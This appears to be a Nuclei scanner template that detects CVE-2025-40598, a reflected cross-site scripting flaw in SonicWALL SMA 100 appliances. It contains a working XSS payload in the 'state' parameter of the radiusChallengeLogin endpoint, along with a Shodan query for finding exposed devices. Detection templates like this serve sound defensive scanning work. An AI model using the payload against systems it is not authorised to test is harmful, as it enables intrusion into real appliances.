id: CVE-2025-40598

info:
  name: SonicWALL SMA 100 - Web Interface Cross Site Scripting
  author: watchtowr,DhiyaneshDK
  severity: medium
  description: |
    A Reflected cross-site scripting (XSS) vulnerability exists in the SMA100 series web interface, allowing a remote unauthenticated attacker to potentially execute arbitrary JavaScript code.
  reference:
    - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0012
    - https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/
  metadata:
    max-request: 1
    shodan-query: product:"SonicWALL SSL VPN http proxy"
  tags: cve,cve2025,xss,cgi-bin,sonicwall,sma100,sslvpn

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/radiusChallengeLogin?portalName=portal1&status=needchallenge&state=\"><img/src=x+onerror=alert`1`>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"><img/src=x+onerror=alert`1`>'
          - 'SMA'
        condition: and

      - type: word
        part: content_type
        words:
          - 'text/html'
